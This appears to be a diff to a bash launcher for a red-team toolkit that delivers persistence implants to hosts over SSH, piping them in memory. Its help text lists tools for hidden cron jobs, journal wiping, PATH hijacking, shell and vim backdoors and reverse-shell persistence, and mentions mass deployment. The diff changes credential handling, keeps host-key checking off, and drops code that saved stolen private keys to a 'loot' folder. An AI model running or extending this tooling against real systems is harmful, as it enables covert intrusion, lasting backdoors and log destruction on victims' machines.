@@ -10,12 +10,13 @@
 #
 # Connection options:
 #   -t, --target USER@HOST   SSH target (required for remote tools)
-#   -p, --pass PASS          SSH login password (uses sshpass); also used as
-#                            sudo password unless -S overrides it
-#   -i, --identity FILE      SSH private key file
 #   -P, --port PORT          SSH port (default: 22)
-#   -S, --sudo-pass PASS     Sudo password (overrides -p for sudo only)
 #       --no-sudo            Don't prepend sudo (already SSH'd in as root)
+#
+# Authentication:
+#   You will be prompted to type the SSH/sudo password interactively.
+#   For scripted/parallel use (e.g. mass-deploy.sh), set RT_SSH_PASS and
+#   optionally RT_SUDO_PASS as environment variables.
 #
 # Other:
 #       --list               List all tools and exit
@@ -25,7 +26,7 @@
 # ── REMOTE tools (piped to target, never written to disk) ──────────────────────
 #   shadow-crond          install|remove|status
 #   nuke-journal          install|remove|status|wipe
-#   ureadahead-persist    install|remove|status [--key "ssh-ed25519 ..."]
+#   ureadahead-persist    install|remove|status
 #   lock-busybox          install|remove|status
 #   poison-timer          install|remove|status
 #   evil-timer            install|remove|status   (user-level, no sudo needed)
@@ -43,8 +44,8 @@
 #   the-toucher           install|remove|status
 #   alias-bashrc          install|remove
 #   vim-persist           install|remove
-#   path-hijack           scan|install [--level system|cron] [--key "..."] [--commands "..."] [--payload 1|2|3]
-#   path-hijack-user      scan|install [--level user]        [--key "..."] [--commands "..."]
+#   path-hijack           scan|install [--level system|cron] [--commands "..."] [--payload 1|2|3]
+#   path-hijack-user      scan|install [--level user]        [--commands "..."]
 #
 # ── LOCAL tools (run on Kali, target the host themselves via SSH/HTTP/etc.) ────
 #   linux-persist    <target_ip> <user> <pass> [lhost] [lport]
@@ -106,7 +107,6 @@ declare -A TOOLS=(
 
 # ── argument parsing ──────────────────────────────────────────────────────────
 TARGET=""
-SSH_KEY=""
 SSH_PORT="22"
 SSH_PASS=""
 SUDO_PASS=""
@@ -137,10 +137,7 @@ POSITIONAL=()
 while [[ $# -gt 0 ]]; do
     case "$1" in
         -t|--target)    TARGET="$2";    shift 2 ;;
-        -p|--pass)      SSH_PASS="$2";  shift 2 ;;
-        -i|--identity)  SSH_KEY="$2";   shift 2 ;;
         -P|--port)      SSH_PORT="$2";  shift 2 ;;
-        -S|--sudo-pass) SUDO_PASS="$2"; shift 2 ;;
         --no-sudo)      USE_SUDO=0;     shift   ;;
         --list)         list_tools; exit 0       ;;
         -v|--verbose)   VERBOSE=1;      shift   ;;
@@ -187,27 +184,25 @@ if [[ -z "$TARGET" ]]; then
     usage 1
 fi
 
+# ── prompt for password (or read from env for scripted/parallel use) ──────────
+if [[ -n "${RT_SSH_PASS:-}" ]]; then
+    SSH_PASS="$RT_SSH_PASS"
+elif [[ -t 0 ]]; then
+    read -rsp $'\033[0;36m[?]\033[0m SSH/sudo password: ' SSH_PASS
+    echo
+fi
+
+SUDO_PASS="${RT_SUDO_PASS:-$SSH_PASS}"
+
 # ── build SSH command array ───────────────────────────────────────────────────
 SSH_OPTS=(
     -o StrictHostKeyChecking=no
     -o ConnectTimeout=10
+    -o PreferredAuthentications=password
+    -o PubkeyAuthentication=no
+    -o BatchMode=no
     -p "$SSH_PORT"
 )
-if [[ -n "$SSH_KEY" ]]; then
-    SSH_OPTS+=(-i "$SSH_KEY")
-elif [[ -n "$SSH_PASS" ]]; then
-    # password auth — force it so we don't wait on key negotiation
-    SSH_OPTS+=(
-        -o PreferredAuthentications=password
-        -o PubkeyAuthentication=no
-        -o BatchMode=no
-    )
-else
-    SSH_OPTS+=(-o BatchMode=no)
-fi
-
-# -p sets sudo password too unless -S was explicitly given
-[[ -n "$SSH_PASS" && -z "$SUDO_PASS" ]] && SUDO_PASS="$SSH_PASS"
 
 # ── base64-encode the script (avoids quoting issues, no file on disk) ─────────
 B64=$(base64 -w0 < "$SCRIPT")
@@ -280,13 +275,6 @@ info "Tool:    $TOOL  ($REL_PATH)"
 [[ $VERBOSE -eq 1 ]]         && hdr "Remote command" && echo "$REMOTE_CMD"
 echo
 
-# ── path-hijack install: tee output so we can save the generated private key ──
-_SAVE_KEY=0
-if [[ ("$TOOL" == "path-hijack" || "$TOOL" == "path-hijack-user") \
-      && "${TOOL_ARGS[0]:-}" == "install" ]]; then
-    _SAVE_KEY=1
-fi
-
 _run_ssh() {
     if [[ -n "$SSH_PASS" ]]; then
         sshpass -p "$SSH_PASS" ssh "${SSH_OPTS[@]}" "$TARGET" "$REMOTE_CMD"
@@ -295,22 +283,4 @@ _run_ssh() {
     fi
 }
 
-if [[ $_SAVE_KEY -eq 1 ]]; then
-    _SSH_OUT=$(mktemp /dev/shm/.rt-key-XXXXXXXX)
-    trap 'rm -f "$_SSH_OUT"' EXIT
-    _run_ssh | tee "$_SSH_OUT"
-    _SSH_RC=${PIPESTATUS[0]}
-    # Extract the private key block and save it
-    _KEY=$(sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' "$_SSH_OUT")
-    if [[ -n "$_KEY" ]]; then
-        mkdir -p "${RT_DIR}/loot"
-        _KEYFILE="${RT_DIR}/loot/path-hijack_${TARGET//[@:.]/_}_ed25519"
-        printf '%s\n' "$_KEY" > "$_KEYFILE"
-        chmod 600 "$_KEYFILE"
-        info "Private key saved → ${_KEYFILE}"
-    fi
-    rm -f "$_SSH_OUT"
-    exit $_SSH_RC
-else
-    _run_ssh
-fi
+_run_ssh
